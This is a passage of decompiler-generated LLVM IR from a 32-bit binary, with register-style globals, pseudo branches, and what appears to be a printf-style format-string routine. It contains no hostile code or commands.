dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d78.loopexit, %dec_label_pc_10d38
  %v1_10d78 = phi i32 [ 0, %dec_label_pc_10d38 ], [ %v1_10d78.pre, %dec_label_pc_10d78.loopexit ]
  %v0_10d78 = phi i32 [ 0, %dec_label_pc_10d38 ], [ %v0_10d78.ph, %dec_label_pc_10d78.loopexit ]
  %v2_10d78 = sub i32 %v1_10d78, %v0_10d78
  store i32 %v3_10d38, i32* @r4, align 4
  store i32 %v6_10d38, i32* @r5, align 4
  store i32 %v9_10d38, i32* @r6, align 4
  ret i32 %v2_10d78

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10d78.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10d6c, { 1, 0 }
}

define i32 @function_10d84(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10d84:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10d84 = load i32, i32* @r4, align 4
  store i32 %v3_10d84, i32* %stack_var_-24, align 4
  %v9_10d84 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_10d8c = and i32 %arg2, 128
  %v2_10d8c = icmp eq i32 %v1_10d8c, 0
  %v0_10d90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d90, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_10d8c, label %bb, label %dec_label_pc_10da4

bb:                                               ; preds = %dec_label_pc_10d84
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10de4

dec_label_pc_10da4:                               ; preds = %dec_label_pc_10d84
  store i32 %arg4, i32* @r0, align 4
  %v0_10da8 = call i32 @function_11e30()
  store i32 %v0_10da8, i32* %r0.global-to-local, align 4
  %v1_10dac = load i32, i32* %r4.global-to-local, align 4
  %v2_10dac = sub i32 %v1_10dac, %v0_10da8
  store i32 %v2_10dac, i32* @r4, align 4
  store i32 %v0_10da8, i32* @r5, align 4
  %tmp15 = icmp slt i32 %v2_10dac, 1
  br i1 %tmp15, label %.thread, label %dec_label_pc_10dc4

.thread:                                          ; preds = %dec_label_pc_10da4
  store i32 %v0_10da8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10de4

dec_label_pc_10dc4:                               ; preds = %dec_label_pc_10da4
  %v0_10dc4 = load i32, i32* @r6, align 4
  %v1_10dc4 = urem i32 %v0_10dc4, 128
  %v0_10dc8 = load i32, i32* @r8, align 4
  store i32 %v0_10dc8, i32* %r0.global-to-local, align 4
  %v3_10dd0 = trunc i32 %v1_10dc4 to i8
  %v4_10dd0 = call i32 @function_10d38(i32 %v0_10dc8, i8 %v3_10dd0, i32 %v2_10dac)
  store i32 %v4_10dd0, i32* %r0.global-to-local, align 4
  %v1_10dd4 = load i32, i32* @r4, align 4
  %v9_10dd4 = icmp eq i32 %v4_10dd0, %v1_10dd4
  store i32 %v4_10dd0, i32* %r6.global-to-local, align 4
  br i1 %v9_10dd4, label %dec_label_pc_10de0, label %dec_label_pc_10e00

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10dc4
  %v0_10de0 = load i32, i32* @r5, align 4
  store i32 %v0_10de0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10de4

dec_label_pc_10de4:                               ; preds = %bb, %.thread, %dec_label_pc_10de0
  %v5_10df0 = phi i32 [ %v0_10de0, %dec_label_pc_10de0 ], [ %arg3, %bb ], [ %v0_10da8, %.thread ]
  %tmp16 = icmp slt i32 %v5_10df0, 1
  br i1 %tmp16, label %.thread8, label %bb17

.thread8:                                         ; preds = %dec_label_pc_10de4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_10de4
  %v5_10dec = load i32, i32* @r7, align 4
  br label %bb18

bb18:                                             ; preds = %.thread8, %bb17
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_10dec, %bb17 ]
  %tmp19 = phi i1 [ false, %.thread8 ], [ true, %bb17 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp19, i32 ptrtoint (i32* @global_var_1428c.249 to i32))
  %v0_10dfc = load i32, i32* %r6.global-to-local, align 4
  %v2_10dfc = add i32 %storemerge, %v0_10dfc
  store i32 %v2_10dfc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10dc4, %bb18
  %v0_10e00 = phi i32 [ %v4_10dd0, %dec_label_pc_10dc4 ], [ %v2_10dfc, %bb18 ]
  store i32 %v0_10e00, i32* %r0.global-to-local, align 4
  %v2_10e04 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10e04, i32* %r4.global-to-local, align 4
  store i32 %v9_10d84, i32* %r6.global-to-local, align 4
  ret i32 %v0_10e00

; uselistorder directives
  uselistorder i32 %v0_10e00, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10e00, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_10de4, { 2, 1, 0 }
}

define i32 @function_10e08(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10e08:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e08 = load i32, i32* @r4, align 4
  store i32 %v3_10e08, i32* %stack_var_-36, align 4
  %v15_10e08 = load i32, i32* @r8, align 4
  %v18_10e08 = load i32, i32* @sb, align 4
  %v21_10e08 = load i32, i32* @sl, align 4
  %v24_10e08 = load i32, i32* @fp, align 4
  %v2_10e10 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_10e10, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_10e10, i32* %r0.global-to-local, align 4
  %v0_10e1c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10e1c, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_10e24 = call i32 @function_113fc(i32* nonnull %stack_var_-332)
  store i32 %v2_10e24, i32* %r0.global-to-local, align 4
  %v1_10e28 = icmp slt i32 %v2_10e24, 0
  br i1 %v1_10e28, label %dec_label_pc_10e30, label %dec_label_pc_10e64

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e08
  %v3_10e30 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_10e30, i32* @r4, align 4
  store i32 %v3_10e30, i32* @r0, align 4
  %v0_10e38 = call i32 @function_11e30()
  store i32 %v0_10e38, i32* %r0.global-to-local, align 4
  %v2_10e3c = icmp eq i32 %v0_10e38, 0
  br i1 %v2_10e3c, label %bb, label %dec_label_pc_10e4c

bb:                                               ; preds = %dec_label_pc_10e30
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_113dc

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e30
  %v0_10e4c = load i32, i32* @r4, align 4
  store i32 %v0_10e4c, i32* %r0.global-to-local, align 4
  %v0_10e50 = load i32, i32* @fp, align 4
  store i32 %v0_10e50, i32* %r2.global-to-local, align 4
  %v3_10e54 = call i32 @function_1428c(i32 %v0_10e4c, i32 %v0_10e38, i32 %v0_10e50)
  store i32 %v3_10e54, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_113dc

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e08
  store i32 %v2_10e10, i32* %r0.global-to-local, align 4
  %v0_10e68 = load i32, i32* @r5, align 4
  %v2_10e6c = call i32 @function_11494(i32 %v2_10e10, i32 %v0_10e68)
  store i32 %v2_10e6c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_10f0c = zext i8 %tmp104 to i32
  %v2_10f14 = ptrtoint i32* %stack_var_-252 to i32
  %v2_10f34 = ptrtoint i32* %stack_var_-36 to i32
  %v2_10f4c = icmp eq i32 %tmp102, 0
  %v1_10f60 = inttoptr i32 %tmp101 to i32*
  %v2_11250 = ptrtoint i32* %stack_var_-180 to i32
  %v2_1116c = ptrtoint i32* %stack_var_-44 to i32
  %v2_11180 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1111c = add i32 %tmp101, 4
  %v4_1111c = inttoptr i32 %v3_1111c to i32*
  %v2_11120 = ptrtoint i32* %stack_var_-328 to i32
  %v7_10fe0 = zext i8 %tmp99 to i32
  %v2_1101c = ptrtoint i32* %stack_var_-53 to i32
  %v5_11024 = bitcast i32* %stack_var_-53 to i8*
  %v2_1102c = icmp ugt i32 %tmp102, 4
  %v7_1102c = icmp eq i32 %tmp102, 5
  %v0_113c4.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_10f44187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_11140 = icmp ugt i32 %tmp102, 16
  %v7_11140 = icmp eq i32 %tmp102, 17
  %v2_11144 = xor i1 %v7_11140, true
  %v3_11144 = and i1 %v2_11140, %v2_11144
  %v2_111e0 = icmp ugt i32 %tmp102, 18
  %v7_111e0 = icmp eq i32 %tmp102, 19
  %v2_111e4 = xor i1 %v7_111e0, true
  %v3_111e4 = and i1 %v2_111e0, %v2_111e4
  %v7_11244 = icmp eq i32 %tmp102, 20
  %v2_10f84 = add i32 %tmp102, ptrtoint (i32* @global_var_1756c.251 to i32)
  %v1_10f88 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1756c.251 to i32), i32 -1)
  %v2_10f88 = inttoptr i32 %v1_10f88 to i8*
  %v2_10fb4 = xor i1 %v7_1102c, true
  %v3_10fb4 = and i1 %v2_1102c, %v2_10fb4
  %v7_10fe8 = icmp eq i32 %tmp102, 1
  %v2_11034 = xor i1 %v2_1102c, true
  %v3_11034 = or i1 %v7_1102c, %v2_11034
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_1109c = icmp eq i32 %tmp102, 3
  %v11_110a8 = icmp eq i32 %tmp102, 4
  %v9_10f18 = mul nuw nsw i32 %v4_10f0c, 8
  %v10_10f18 = add nsw i32 %v9_10f18, -8
  %v6_10f20 = add i32 %v10_10f18, %v2_10f14
  br label %dec_label_pc_113c4

bb126:                                            ; preds = %dec_label_pc_10e7c.outer, %.thread7
  %v2_10e7c185 = phi i8 [ %v2_10e7c, %.thread7 ], [ %v2_10e7c181, %dec_label_pc_10e7c.outer ]
  %v1_10e90184 = phi i32 [ %v2_10e90, %.thread7 ], [ %v0_10e7c49, %dec_label_pc_10e7c.outer ]
  %v8_10e84 = icmp eq i8 %v2_10e7c185, 37
  br i1 %v8_10e84, label %dec_label_pc_10e98, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10e90 = add i32 %v1_10e90184, 1
  store i32 %v2_10e90, i32* @r4, align 4
  %v1_10e7c = inttoptr i32 %v2_10e90 to i8*
  %v2_10e7c = load i8, i8* %v1_10e7c, align 1
  %v3_10e7c = zext i8 %v2_10e7c to i32
  store i32 %v3_10e7c, i32* %r3.global-to-local, align 4
  %v2_10e80 = icmp eq i8 %v2_10e7c, 0
  br i1 %v2_10e80, label %dec_label_pc_10e98, label %bb126

dec_label_pc_10e98:                               ; preds = %bb126, %.thread7, %dec_label_pc_10e7c.outer
  %v1_10e90.lcssa = phi i32 [ %v0_10e7c49, %dec_label_pc_10e7c.outer ], [ %v2_10e90, %.thread7 ], [ %v1_10e90184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10e98 = sub i32 %v1_10e90.lcssa, %v5_10ea8
  %v9_10e98 = icmp eq i32 %v1_10e90.lcssa, %v5_10ea8
  br i1 %v9_10e98, label %dec_label_pc_10ecc, label %dec_label_pc_10ea0

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e98
  store i32 %v2_10e98, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_10e98, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_10ea0
  store i32 %v5_10ea8, i32* %r0.global-to-local, align 4
  %v5_10eb0 = load i32, i32* @fp, align 4
  store i32 %v5_10eb0, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_10ea0, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_10ea0 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_1428c.249 to i32))
  %v0_10eb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10eb8 = load i32, i32* @r5, align 4
  %v9_10eb8 = icmp eq i32 %v0_10eb8, %v1_10eb8
  br i1 %v9_10eb8, label %dec_label_pc_10ec0, label %dec_label_pc_113d4

dec_label_pc_10ec0:                               ; preds = %bb130
  %v2_10ec4 = add i32 %v0_10eb8, %stack_var_-336.1.ph
  %v0_10ecc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10e98, %dec_label_pc_10ec0
  %v0_10ee0 = phi i32 [ %v5_10ea8, %dec_label_pc_10e98 ], [ %v0_10ecc.pre, %dec_label_pc_10ec0 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_10e98 ], [ %v2_10ec4, %dec_label_pc_10ec0 ]
  %v1_10ecc = inttoptr i32 %v0_10ee0 to i8*
  %v2_10ecc = load i8, i8* %v1_10ecc, align 1
  %v3_10ecc = zext i8 %v2_10ecc to i32
  store i32 %v3_10ecc, i32* %r3.global-to-local, align 4
  %v2_10ed0 = icmp eq i8 %v2_10ecc, 0
  br i1 %v2_10ed0, label %dec_label_pc_113dc, label %dec_label_pc_10ed8

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10ecc
  %v1_10ed8 = add i32 %v0_10ee0, 1
  %v2_10ed8 = inttoptr i32 %v1_10ed8 to i8*
  %v3_10ed8 = load i8, i8* %v2_10ed8, align 1
  %v4_10ed8 = zext i8 %v3_10ed8 to i32
  store i32 %v4_10ed8, i32* %r3.global-to-local, align 4
  %v7_10edc = icmp eq i8 %v3_10ed8, 37
  store i32 %v1_10ed8, i32* %r2.global-to-local, align 4
  br i1 %v7_10edc, label %dec_label_pc_113cc, label %dec_label_pc_10ee8

dec_label_pc_10ee8:                               ; preds = %dec_label_pc_10ed8
  store i32 %v2_10e10, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_10e10, i32* %r0.global-to-local, align 4
  store i32 %v1_10ed8, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10efc = call i32 @function_116b4(i32* nonnull %stack_var_-332)
  store i32 %v2_10e10, i32* @r0, align 4
  %v0_10f04 = call i32 @function_114cc()
  store i32 %v0_10f04, i32* %r0.global-to-local, align 4
  store i32 %v4_10f0c, i32* %ip.global-to-local, align 4
  store i32 %v2_10f14, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_10ee8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_10ee8
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_10f20, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_10f2c78 = phi i32 [ %v6_10f20, %bb133 ], [ %v2_10f14, %.thread ]
  store i32 %v2_10f34, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_10f44187, label %dec_label_pc_10f2c, label %dec_label_pc_10f48

dec_label_pc_10f2c:                               ; preds = %bb134, %dec_label_pc_10f2c
  %v5_10f3c189 = phi i32 [ %v5_10f3c, %dec_label_pc_10f2c ], [ %v2_10f34, %bb134 ]
  %v0_10f2c188 = phi i32 [ %v1_10f30, %dec_label_pc_10f2c ], [ %v0_10f2c78, %bb134 ]
  %v2_10f2c = add i32 %v5_10f3c189, -4
  %v3_10f2c = inttoptr i32 %v2_10f2c to i32*
  store i32 %v0_10f2c188, i32* %v3_10f2c, align 4
  %v0_10f30 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f30 = add i32 %v0_10f30, 8
  store i32 %v1_10f30, i32* %r3.global-to-local, align 4
  %v0_10f38.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10f38.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_10f34, i32* @lr, align 4
  %v4_10f3c = mul i32 %v0_10f38.pre, 4
  %v5_10f3c = add i32 %v4_10f3c, %v2_10f34
  %v1_10f40 = add i32 %v0_10f38.pre, 1
  store i32 %v1_10f40, i32* %r2.global-to-local, align 4
  %v5_10f44 = icmp slt i32 %v0_10f38.pre, %v1_10f38.pre
  br i1 %v5_10f44, label %dec_label_pc_10f2c, label %dec_label_pc_10f48

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f2c, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_10f4c, label %dec_label_pc_10f54, label %dec_label_pc_10f78

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f48
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_10f60 = load i32, i32* %v1_10f60, align 4
  store i32 %v2_10f60, i32* %r0.global-to-local, align 4
  %v1_10f64 = and i32 %v0_10fa8, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_10f6c = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_10f6c, i32* %r3.global-to-local, align 4
  %v4_10f70 = inttoptr i32 %v2_10f60 to i8*
  %v5_10f70 = call i32 @function_14538(i8* %v4_10f70, i32 %v1_10f64, i32 %stack_var_-336.2, i32 %v3_10f6c)
  store i32 %v5_10f70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113c0

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f48
  br i1 %tmp195, label %dec_label_pc_11104, label %dec_label_pc_10f80

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f78
  store i32 %v2_10f84, i32* %r3.global-to-local, align 4
  %v3_10f88 = load i8, i8* %v2_10f88, align 1
  %v4_10f88 = zext i8 %v3_10f88 to i32
  store i32 %v4_10f88, i32* @r4, align 4
  %v7_10f8c = icmp eq i8 %v3_10f88, 10
  br i1 %v7_10f8c, label %dec_label_pc_10f98, label %bb135

bb135:                                            ; preds = %dec_label_pc_10f80
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_10f98:                               ; preds = %dec_label_pc_10f80
  store i32 %v0_10fa8, i32* %r3.global-to-local, align 4
  %v1_10f9c = and i32 %v0_10fa8, 32
  %v2_10f9c = icmp eq i32 %v1_10f9c, 0
  %.175 = select i1 %v2_10f9c, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_10fa8 = and i32 %v0_10fa8, 64
  %v2_10fa8 = icmp eq i32 %v1_10fa8, 0
  br i1 %v2_10fa8, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_10f98
  %.176 = select i1 %v2_10f9c, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_10f98, %bb138
  br i1 %v3_10fb4, label %.thread84, label %dec_label_pc_10fbc

.thread84:                                        ; preds = %bb139
  %v5_10fb4 = sub nsw i32 0, %v4_10f88
  store i32 %v5_10fb4, i32* @r4, align 4
  br label %dec_label_pc_10fd4

dec_label_pc_10fbc:                               ; preds = %bb139
  br i1 %v7_1109c, label %bb140, label %dec_label_pc_10fc8

bb140:                                            ; preds = %dec_label_pc_10fbc
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_10fd4

dec_label_pc_10fc8:                               ; preds = %dec_label_pc_10fbc
  br i1 %v7_10fe8, label %dec_label_pc_10fd8, label %dec_label_pc_10fd4

dec_label_pc_10fd4:                               ; preds = %.thread84, %bb140, %dec_label_pc_10fc8
  %v0_1100086 = phi i32 [ %v5_10fb4, %.thread84 ], [ %v4_10f88, %bb140 ], [ %v4_10f88, %dec_label_pc_10fc8 ]
  br label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %dec_label_pc_10fc8, %dec_label_pc_10fd4
  %v0_1100085 = phi i32 [ %v0_1100086, %dec_label_pc_10fd4 ], [ %v4_10f88, %dec_label_pc_10fc8 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_10fd4 ], [ 6, %dec_label_pc_10fc8 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_10fd8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10fd8, i32* %r3.global-to-local, align 4
  %v1_10fdc = icmp slt i32 %v3_10fd8, 0
  %v7_10fe0. = select i1 %v1_10fdc, i32 %v7_10fe0, i32 32
  store i32 %v7_10fe0., i32* @sb, align 4
  br i1 %v7_10fe8, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_10fd8
  store i32 %v2_10f34, i32* @lr, align 4
  %v2_10ff0 = load i32, i32* %ip.global-to-local, align 4
  %v5_10ff0 = mul i32 %v2_10ff0, 4
  %v6_10ff0 = add i32 %v5_10ff0, %v2_10f34
  store i32 %v6_10ff0, i32* %r3.global-to-local, align 4
  %v2_10ff4 = add i32 %v6_10ff0, -260
  %v3_10ff4 = inttoptr i32 %v2_10ff4 to i32*
  %v4_10ff4 = load i32, i32* %v3_10ff4, align 4
  store i32 %v4_10ff4, i32* %r3.global-to-local, align 4
  %v2_10ffc = and i32 %v4_10ff4, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_10fd8, %.thread16
  %storemerge94 = phi i32 [ %v2_10ffc, %.thread16 ], [ 1024, %dec_label_pc_10fd8 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1100085, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_11008 = call i32 @function_144c8()
  %v0_1100c = load i32, i32* @r1, align 4
  store i32 %v0_1100c, i32* %r2.global-to-local, align 4
  %v0_11018 = load i32, i32* @r4, align 4
  store i32 %v0_11018, i32* %r3.global-to-local, align 4
  store i32 %v2_1101c, i32* %r0.global-to-local, align 4
  %v0_11020 = load i32, i32* @r5, align 4
  %v6_11024 = call i32 @function_1456c(i8* %v5_11024, i32 %v0_11008, i32 %v0_1100c, i32 %v0_11018, i32 %v0_11020)
  store i32 %v6_11024, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_11024, i32* @r6, align 4
  br i1 %v3_11034, label %bb148, label %dec_label_pc_11038

dec_label_pc_11038:                               ; preds = %bb145
  %v7_11024 = inttoptr i32 %v6_11024 to i8*
  %v3_11038 = load i8, i8* %v7_11024, align 1
  %v7_1103c = icmp eq i8 %v3_11038, 45
  %v2_11044 = or i32 %v0_10fa8, 2
  %v2_11044.stack_var_-316.4 = select i1 %v7_1103c, i32 %v2_11044, i32 %v0_10fa8
  store i32 %v2_11044.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_1103c, label %.thread18, label %dec_label_pc_11058

.thread18:                                        ; preds = %dec_label_pc_11038
  %v3_11048 = add i32 %v6_11024, 1
  store i32 %v3_11048, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_11058:                               ; preds = %dec_label_pc_11038
  %v1_11058 = and i32 %v2_11044.stack_var_-316.4, 2
  %v2_11058 = icmp eq i32 %v1_11058, 0
  br i1 %v2_11058, label %dec_label_pc_11064, label %bb146

bb146:                                            ; preds = %dec_label_pc_11058
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_11064:                               ; preds = %dec_label_pc_11058
  %v1_11064 = urem i32 %v2_11044.stack_var_-316.4, 2
  %v2_11064 = icmp eq i32 %v1_11064, 0
  br i1 %v2_11064, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_11064
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_11064, %bb147
  %v0_110c0 = phi i32 [ %v6_11024, %bb145 ], [ %v3_11048, %.thread18 ], [ %v6_11024, %dec_label_pc_11064 ], [ %v6_11024, %bb147 ], [ %v6_11024, %bb146 ]
  %v0_1107c = phi i32 [ %v0_10fa8, %bb145 ], [ %v2_11044, %.thread18 ], [ %v0_10fa8, %dec_label_pc_11064 ], [ %v0_10fa8, %bb147 ], [ %v0_10fa8, %bb146 ]
  %v3_1106c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_1106c, i32* %r2.global-to-local, align 4
  store i32 %v0_1107c, i32* %r3.global-to-local, align 4
  %v1_11074 = icmp slt i32 %v3_1106c, 0
  br i1 %v1_11074, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_110a4 = phi i32 [ %v3_1106c, %bb148 ], [ 1, %bb149 ]
  %v1_1107c = and i32 %v0_1107c, 16
  %v2_1107c = icmp eq i32 %v1_1107c, 0
  store i32 %v2_11250, i32* %r3.global-to-local, align 4
  %v2_11084 = sub i32 %v2_11250, %v0_110c0
  %v1_11088 = add i32 %v2_11084, 127
  store i32 %v1_11088, i32* @r5, align 4
  br i1 %v2_1107c, label %bb157, label %dec_label_pc_11090

dec_label_pc_11090:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_11090
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_11090, %bb151
  br i1 %v7_1109c, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_110a4, %v1_11088
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_110a8, label %dec_label_pc_110b0, label %bb157

dec_label_pc_110b0:                               ; preds = %bb155
  %v1_110b0 = inttoptr i32 %v0_110c0 to i8*
  %v2_110b0 = load i8, i8* %v1_110b0, align 1
  %v3_110b0 = zext i8 %v2_110b0 to i32
  store i32 %v3_110b0, i32* %r3.global-to-local, align 4
  %v7_110b4 = icmp eq i8 %v2_110b0, 48
  br i1 %v7_110b4, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_110b0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_110b0
  %v2_110bc = add i32 %v2_11084, 128
  store i32 %v2_110bc, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_110f8 = phi i32 [ %v0_110a4, %bb155 ], [ %v0_110a4, %bb150 ], [ 1, %bb156 ], [ %v2_110bc, %.thread25 ], [ %v0_110a4, %bb154 ]
  %v1_110c0 = inttoptr i32 %v0_110c0 to i8*
  %v2_110c0 = load i8, i8* %v1_110c0, align 1
  %v3_110c0 = zext i8 %v2_110c0 to i32
  store i32 %v3_110c0, i32* %r3.global-to-local, align 4
  %v7_110c4 = icmp eq i8 %v2_110c0, 48
  br i1 %v7_110c4, label %dec_label_pc_110cc, label %dec_label_pc_110f4

dec_label_pc_110cc:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_110d0 = load i32, i32* @r7, align 4
  %v7_110d4 = icmp slt i32 %v0_110d0, 6
  br i1 %v7_110d4, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_110cc
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_110cc, %bb158
  br i1 %v7_10fe8, label %.thread26, label %dec_label_pc_110e8

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_17550.253 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
